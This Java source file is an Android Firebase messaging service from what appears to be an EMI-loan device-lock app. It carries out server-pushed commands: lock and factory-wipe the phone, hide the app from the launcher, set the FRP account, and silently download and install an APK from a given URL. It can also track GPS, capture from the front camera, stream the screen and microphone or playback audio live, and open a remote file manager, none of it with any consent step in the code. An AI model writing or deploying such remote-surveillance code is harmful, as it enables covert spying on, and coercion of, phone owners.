package com.riad.rrlkr.service;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.riad.rrlkr.App;
import com.riad.rrlkr.R;
import com.riad.rrlkr.admin.EMIDeviceAdminReceiver;
import com.riad.rrlkr.network.ApiClient;
import com.riad.rrlkr.network.ApiService;
import com.riad.rrlkr.network.models.CommandAck;
import com.riad.rrlkr.network.models.HeartbeatRequest;
import com.riad.rrlkr.network.models.HeartbeatResponse;
import com.riad.rrlkr.ui.MainActivity;
import com.riad.rrlkr.util.DeviceProtectedPrefs;
import com.riad.rrlkr.util.DeviceUtils;
import com.riad.rrlkr.util.PreferenceManager;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * Firebase Cloud Messaging Service
 * Handles incoming push notifications from server
 */
public class EMIFirebaseMessagingService extends FirebaseMessagingService {
    
    private static final String TAG = "EMIFCMService";
    
    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        Log.i(TAG, "New FCM token received");
        
        // Save token to BOTH storages
        PreferenceManager prefs = new PreferenceManager(this);
        prefs.setFcmToken(token);
        
        try {
            DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
            dpPrefs.saveString("dp_fcm_token", token);
        } catch (Exception e) {
            Log.w(TAG, "Could not save FCM token to device-protected storage: " + e.getMessage());
        }
        
        // Immediately push token to server via heartbeat (don't wait for scheduled heartbeat)
        if (prefs.isEnrolled()) {
            Log.i(TAG, "Sending immediate heartbeat with new FCM token");
            try {
                String imei = DeviceUtils.getIMEI(this);
                String androidId = null;
                try {
                    androidId = android.provider.Settings.Secure.getString(
                            getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
                } catch (Exception ignored) {}
                boolean hasImei = imei != null && !imei.isEmpty();
                boolean hasAndroidId = androidId != null && !androidId.isEmpty();
                if (hasImei || hasAndroidId) {
                    ApiService apiService = ApiClient.getApiService();
                    HeartbeatRequest request = new HeartbeatRequest();
                    request.setImei(imei);
                    request.setAndroidId(androidId);
                    request.setFcmToken(token);
                    request.setBatteryLevel(DeviceUtils.getBatteryLevel(this));
                    request.setNetworkType(DeviceUtils.getNetworkType(this));
                    request.setAppVersion(DeviceUtils.getAppVersion(this));
                    request.setDeviceModel(android.os.Build.MODEL);
                    request.setBrand(android.os.Build.BRAND);
                    request.setManufacturer(android.os.Build.MANUFACTURER);
                    request.setAndroidVersion(android.os.Build.VERSION.RELEASE);
                    
                    apiService.sendHeartbeat(request).enqueue(new Callback<HeartbeatResponse>() {
                        @Override
                        public void onResponse(Call<HeartbeatResponse> call, Response<HeartbeatResponse> response) {
                            if (response.isSuccessful()) {
                                Log.i(TAG, "FCM token sent to server via immediate heartbeat");
                            } else {
                                Log.w(TAG, "Immediate heartbeat failed: " + response.code());
                            }
                        }
                        @Override
                        public void onFailure(Call<HeartbeatResponse> call, Throwable t) {
                            Log.w(TAG, "Immediate heartbeat error: " + t.getMessage());
                        }
                    });
                }
            } catch (Exception e) {
                Log.w(TAG, "Failed to send immediate heartbeat: " + e.getMessage());
            }
        }
    }
    
    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        
        Log.i(TAG, "FCM message received from: " + remoteMessage.getFrom());
        
        Map<String, String> data = remoteMessage.getData();
        if (data.isEmpty()) {
            Log.w(TAG, "Empty FCM data message");
            return;
        }
        
        String commandType = data.get("command_type");
        String commandId = data.get("command_id");
        
        Log.i(TAG, "Command received: " + commandType + " (ID: " + commandId + ")");
        
        if (commandType == null) {
            Log.w(TAG, "No command_type in message");
            return;
        }
        
        // Process command
        processCommand(commandType, data, commandId);
    }
    
    private void processCommand(String commandType, Map<String, String> data, String commandId) {
        try {
            switch (commandType.toUpperCase()) {
                case "LOCK":
                    handleLockCommand(data, commandId);
                    break;
                    
                case "UNLOCK":
                    handleUnlockCommand(commandId);
                    break;
                    
                case "WARNING":
                    handleWarningCommand(data, commandId);
                    break;
                    
                case "WIPE":
                    handleWipeCommand(commandId);
                    break;
                    
                case "SYNC":
                    handleSyncCommand(commandId);
                    break;
                    
                case "HIDE_APP":
                    handleHideAppCommand(commandId);
                    break;
                    
                case "UNHIDE_APP":
                    handleUnhideAppCommand(commandId);
                    break;
                    
                case "DISABLE_APP":
                    handleDisableAppCommand(commandId);
                    break;
                    
                case "ENABLE_APP":
                    handleEnableAppCommand(commandId);
                    break;
                    
                case "UNINSTALL_APP":
                    handleUninstallAppCommand(commandId);
                    break;
                    
                case "GPS_TRACK":
                    handleGPSTrackCommand(commandId);
                    break;
                    
                case "CAMERA_ON":
                    handleCameraOnCommand(data, commandId);
                    break;
                    
                case "CAMERA_OFF":
                    handleCameraOffCommand(commandId);
                    break;
                    
                case "SHOW_MESSAGE":
                    handleShowMessageCommand(data, commandId);
                    break;
                    
                case "UPDATE_POLICY":
                    handleUpdatePolicyCommand(commandId);
                    break;
                    
                case "SET_FRP_ACCOUNT":
                    handleSetFRPAccountCommand(data, commandId);
                    break;
                    
                case "UPDATE_APP":
                    handleUpdateAppCommand(data, commandId);
                    break;

                case "START_SCREEN_MIRROR":
                    handleStartScreenMirror(data, commandId);
                    break;

                case "STOP_SCREEN_MIRROR":
                    handleStopScreenMirror(commandId);
                    break;

                case "START_AUDIO_STREAM":
                    handleStartAudioStream(data, commandId);
                    break;

                case "STOP_AUDIO_STREAM":
                    handleStopAudioStream(commandId);
                    break;

                case "START_FILE_MANAGER":
                    handleStartFileManager(commandId);
                    break;

                case "STOP_FILE_MANAGER":
                    handleStopFileManager(commandId);
                    break;

                default:
                    Log.w(TAG, "Unknown command type: " + commandType);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing command", e);
            acknowledgeCommand(commandId, "failed", e.getMessage());
        }
    }
    
    private void handleLockCommand(Map<String, String> data, String commandId) {
        Log.i(TAG, "Processing LOCK command");
        
        String message = data.get("message");
        String contactNumber = data.get("contact_number");
        
        if (message == null || message.isEmpty()) {
            message = "Your device has been locked by the administrator.";
        }
        
        // Mark as admin-initiated lock in BOTH storages
        com.riad.rrlkr.util.PreferenceManager prefs = new com.riad.rrlkr.util.PreferenceManager(this);
        prefs.saveBoolean("admin_lock_command", true);
        prefs.setDeviceLocked(true);
        
        // Save to device-protected storage (survives reboot + data clear)
        try {
            DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
            dpPrefs.setDeviceLocked(true);
            dpPrefs.saveBoolean("admin_lock_command", true);
        } catch (Exception e) {
            Log.w(TAG, "Could not save lock state to device-protected prefs: " + e.getMessage());
        }
        
        LockManager.showLockScreen(this, message, contactNumber);
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleUnlockCommand(String commandId) {
        Log.i(TAG, "Processing UNLOCK command");
        
        // Clear admin lock in BOTH storages
        com.riad.rrlkr.util.PreferenceManager prefs = new com.riad.rrlkr.util.PreferenceManager(this);
        prefs.saveBoolean("admin_lock_command", false);
        prefs.setDeviceLocked(false);
        
        try {
            DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);
            dpPrefs.setDeviceLocked(false);
            dpPrefs.saveBoolean("admin_lock_command", false);
        } catch (Exception e) {
            Log.w(TAG, "Could not save unlock state to device-protected prefs: " + e.getMessage());
        }
        
        LockManager.hideLockScreen(this);
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleWarningCommand(Map<String, String> data, String commandId) {
        Log.i(TAG, "Processing WARNING command");
        
        String title = data.get("title");
        String message = data.get("message");
        String dueDate = data.get("due_date");
        String amount = data.get("amount");
        
        if (title == null) title = "Device Management Notice";
        if (message == null) message = "Please comply with device policy to avoid restrictions.";
        
        // Build notification text
        StringBuilder notificationText = new StringBuilder(message);
        if (dueDate != null && !dueDate.isEmpty()) {
            notificationText.append("\nDue Date: ").append(dueDate);
        }
        if (amount != null && !amount.isEmpty()) {
            notificationText.append("\nAmount: â‚¹").append(amount);
        }
        
        // Show notification
        showWarningNotification(title, notificationText.toString());
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleWipeCommand(String commandId) {
        Log.w(TAG, "Processing WIPE command - THIS WILL FACTORY RESET THE DEVICE!");
        
        // Acknowledge before wiping
        acknowledgeCommand(commandId, "executed", null);
        
        // Delay wipe to let acknowledgement send (NOT blocking Thread.sleep)
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            EMIDeviceAdminReceiver.wipeDevice(EMIFirebaseMessagingService.this);
        }, 2000);
    }
    
    private void handleSyncCommand(String commandId) {
        Log.i(TAG, "Processing SYNC command â€” triggering immediate heartbeat");
        
        // Trigger DeviceMonitorService to send heartbeat immediately
        try {
            DeviceMonitorService.start(this);
        } catch (Exception e) {
            Log.w(TAG, "Could not restart monitoring service: " + e.getMessage());
        }
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleHideAppCommand(String commandId) {
        Log.i(TAG, "Processing HIDE_APP command");
        
        DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
        protectionManager.hideAppFromLauncher();
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleUnhideAppCommand(String commandId) {
        Log.i(TAG, "Processing UNHIDE_APP command");
        
        DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
        protectionManager.unhideAppInLauncher();
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleDisableAppCommand(String commandId) {
        Log.w(TAG, "Processing DISABLE_APP command - PERMANENTLY REMOVING APP");
        
        DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
        PreferenceManager prefs = new PreferenceManager(this);
        
        // Mark as disabled FIRST so app doesn't re-apply on restart
        prefs.setAppDisabled(true);
        prefs.setProtectionsApplied(false);
        prefs.setDeviceLocked(false);
        
        // Remove all protections (this re-enables ADB, USB debugging, etc.)
        protectionManager.removeAllProtections();
        
        // Unhide app if hidden
        protectionManager.unhideAppInLauncher();
        
        // Enable status bar
        protectionManager.enableStatusBar();
        
        Log.w(TAG, "App DISABLED - all protections removed, initiating permanent uninstall");
        
        // Acknowledge command before uninstalling
        acknowledgeCommand(commandId, "executed", null);
        
        // Wait briefly for ack to be sent, then clear device owner and uninstall
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            protectionManager.clearDeviceOwnerAndUninstall();
        }, 2000);
    }
    
    private void handleEnableAppCommand(String commandId) {
        Log.i(TAG, "Processing ENABLE_APP command - re-enabling all protections");
        
        DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
        PreferenceManager prefs = new PreferenceManager(this);
        
        // Clear disabled flag so app re-applies protections on restart
        prefs.setAppDisabled(false);
        
        // Re-apply all protections
        protectionManager.applyAllProtections();
        prefs.setProtectionsApplied(true);
        
        Log.i(TAG, "App ENABLED - all protections re-applied");
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleUninstallAppCommand(String commandId) {
        Log.w(TAG, "Processing UNINSTALL_APP command - PERMANENTLY REMOVING APP");
        
        DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
        PreferenceManager prefs = new PreferenceManager(this);
        
        // Mark as disabled first
        prefs.setAppDisabled(true);
        prefs.setProtectionsApplied(false);
        prefs.setDeviceLocked(false);
        
        // Remove all protections (re-enables ADB, USB, etc.)
        protectionManager.removeAllProtections();
        protectionManager.unhideAppInLauncher();
        protectionManager.enableStatusBar();
        
        // Acknowledge command before uninstalling
        acknowledgeCommand(commandId, "executed", null);
        
        // Wait briefly for ack to be sent, then clear device owner and uninstall
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            protectionManager.clearDeviceOwnerAndUninstall();
        }, 2000);
    }
    
    private void handleShowMessageCommand(Map<String, String> data, String commandId) {
        Log.i(TAG, "Processing SHOW_MESSAGE command");
        
        String title = data.get("title");
        String message = data.get("message");
        
        if (title == null) title = "RR Device Manager";
        if (message == null) message = "Message from administrator";
        
        // Save message to preferences for lock screen display
        PreferenceManager prefs = new PreferenceManager(this);
        prefs.setLockMessage(message);
        
        // If device is currently locked, re-show lock screen with the new message
        if (prefs.isDeviceLocked()) {
            prefs.saveBoolean("admin_lock_command", true);
            LockManager.showLockScreen(this, message, null);
        }
        
        // Always show a notification so user sees the message even when unlocked
        showWarningNotification(title, message);
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleUpdatePolicyCommand(String commandId) {
        Log.i(TAG, "Processing UPDATE_POLICY command");
        
        DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
        protectionManager.applyAllProtections();
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleGPSTrackCommand(String commandId) {
        Log.i(TAG, "Processing GPS_TRACK command - getting device location");
        
        LocationTracker locationTracker = new LocationTracker(this);
        locationTracker.trackAndReport();
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleCameraOnCommand(Map<String, String> data, String commandId) {
        Log.i(TAG, "Processing CAMERA_ON command - starting camera capture");
        
        PreferenceManager prefs = new PreferenceManager(this);
        prefs.setCameraActive(true);
        
        // Ensure camera is not blocked by device policy
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) 
                    getSystemService(DEVICE_POLICY_SERVICE);
            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
                android.content.ComponentName adminComp = 
                        com.riad.rrlkr.admin.EMIDeviceAdminReceiver.getComponentName(this);
                dpm.setCameraDisabled(adminComp, false);
                Log.i(TAG, "Camera explicitly enabled via DPM before capture");
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not enable camera via DPM: " + e.getMessage());
        }
        
        long interval = 3000; // default 3 seconds (small frames -> smoother stream)
        try {
            String intervalStr = data.get("capture_interval");
            if (intervalStr != null && !intervalStr.isEmpty()) {
                interval = Long.parseLong(intervalStr) * 1000; // convert seconds to ms
            }
        } catch (Exception e) {
            Log.w(TAG, "Invalid capture interval, using default");
        }

        String lens = data.get("camera");
        final String captureLens = (lens != null && !lens.isEmpty()) ? lens : "front";

        // Delay to let DPM change take effect (longer for Samsung)
        final long captureInterval = interval;
        long startDelay = android.os.Build.MANUFACTURER.equalsIgnoreCase("samsung") ? 2000 : 1000;
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            RemoteCameraCapture cameraCapture = new RemoteCameraCapture(EMIFirebaseMessagingService.this);
            cameraCapture.captureAndReport(true, captureInterval, captureLens);
        }, startDelay);
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleCameraOffCommand(String commandId) {
        Log.i(TAG, "Processing CAMERA_OFF command - stopping camera capture");
        
        PreferenceManager prefs = new PreferenceManager(this);
        prefs.setCameraActive(false);
        
        RemoteCameraCapture cameraCapture = new RemoteCameraCapture(this);
        cameraCapture.stopCapture();
        
        // Acknowledge command
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleSetFRPAccountCommand(Map<String, String> data, String commandId) {
        Log.i(TAG, "Processing SET_FRP_ACCOUNT command");
        
        String googleAccount = data.get("frp_account");
        if (googleAccount == null || googleAccount.isEmpty()) {
            googleAccount = data.get("message"); // fallback
        }
        
        if (googleAccount == null || googleAccount.isEmpty()) {
            Log.w(TAG, "No FRP account provided");
            acknowledgeCommand(commandId, "failed", "No Google account provided");
            return;
        }
        
        DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
        protectionManager.setFRPAccount(googleAccount);
        
        Log.i(TAG, "FRP account set to: " + googleAccount);
        acknowledgeCommand(commandId, "executed", null);
    }
    
    private void handleUpdateAppCommand(Map<String, String> data, String commandId) {
        Log.i(TAG, "Processing UPDATE_APP command - OTA silent update");
        
        String apkUrl = data.get("apk_url");
        boolean force = "true".equalsIgnoreCase(data.get("force"));
        
        // Acknowledge immediately (download + install runs async)
        acknowledgeCommand(commandId, "executed", null);
        
        AppSelfUpdateService updateService = new AppSelfUpdateService(this);
        
        if (apkUrl != null && !apkUrl.isEmpty()) {
            // Direct download URL provided â€” download and install
            Log.i(TAG, "UPDATE_APP: downloading from " + apkUrl);
            updateService.downloadAndInstall(apkUrl);
        } else {
            // No URL â€” check server for latest version
            Log.i(TAG, "UPDATE_APP: checking server for updates (force=" + force + ")");
            updateService.checkAndUpdate(force);
        }
    }

    // ----- Live screen mirror & audio streaming -----

    private void handleStartScreenMirror(Map<String, String> data, String commandId) {
        int quality = parseInt(data.get("quality"), 50);
        int fps = parseInt(data.get("fps"), 4);
        float scale = parseFloat(data.get("scale"), 0.5f);
        com.riad.rrlkr.streaming.AutoStreamManager.setVideoDesired(this, true, quality, fps, scale);
        com.riad.rrlkr.streaming.StreamingController.startScreenMirror(this, quality, fps, scale);
        acknowledgeCommand(commandId, "executed", null);
    }

    private void handleStopScreenMirror(String commandId) {
        com.riad.rrlkr.streaming.AutoStreamManager.setVideoDesired(this, false, 0, 0, 0);
        com.riad.rrlkr.streaming.StreamingController.stopScreenMirror(this);
        acknowledgeCommand(commandId, "executed", null);
    }

    private void handleStartAudioStream(Map<String, String> data, String commandId) {
        boolean capturePlayback = !"false".equalsIgnoreCase(data.get("capture_playback"));
        com.riad.rrlkr.streaming.AutoStreamManager.setAudioDesired(this, true, capturePlayback);
        com.riad.rrlkr.streaming.StreamingController.startAudioStream(this, capturePlayback);
        acknowledgeCommand(commandId, "executed", null);
    }

    private void handleStopAudioStream(String commandId) {
        com.riad.rrlkr.streaming.AutoStreamManager.setAudioDesired(this, false, false);
        com.riad.rrlkr.streaming.StreamingController.stopAudioStream(this);
        acknowledgeCommand(commandId, "executed", null);
    }

    private void handleStartFileManager(String commandId) {
        Log.i(TAG, "Processing START_FILE_MANAGER command");
        com.riad.rrlkr.filemanager.FileManagerService.start(this);
        acknowledgeCommand(commandId, "executed", null);
    }

    private void handleStopFileManager(String commandId) {
        Log.i(TAG, "Processing STOP_FILE_MANAGER command");
        com.riad.rrlkr.filemanager.FileManagerService.stop(this);
        acknowledgeCommand(commandId, "executed", null);
    }

    private static int parseInt(String s, int def) {
        if (s == null) return def;
        try { return Integer.parseInt(s.trim()); } catch (Exception e) { return def; }
    }

    private static float parseFloat(String s, float def) {
        if (s == null) return def;
        try { return Float.parseFloat(s.trim()); } catch (Exception e) { return def; }
    }

    private void acknowledgeCommand(String commandId, String status, String errorMessage) {
        if (commandId == null) return;
        
        ApiService apiService = ApiClient.getApiService();
        
        CommandAck ack = new CommandAck();
        ack.setCommandId(commandId);
        ack.setStatus(status);
        ack.setErrorMessage(errorMessage);
        
        apiService.acknowledgeCommand(ack).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Command acknowledged: " + commandId);
                } else {
                    Log.e(TAG, "Failed to acknowledge command: " + response.code());
                }
            }
            
            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Error acknowledging command", t);
            }
        });
    }
    
    private void showWarningNotification(String title, String message) {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE
        );
        
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, App.CHANNEL_ID_WARNINGS)
            .setSmallIcon(R.drawable.ic_warning)
            .setContentTitle(title)
            .setContentText(message)
            .setStyle(new NotificationCompat.BigTextStyle().bigText(message))
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .setContentIntent(pendingIntent);
        
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify((int) System.currentTimeMillis(), builder.build());
    }
}
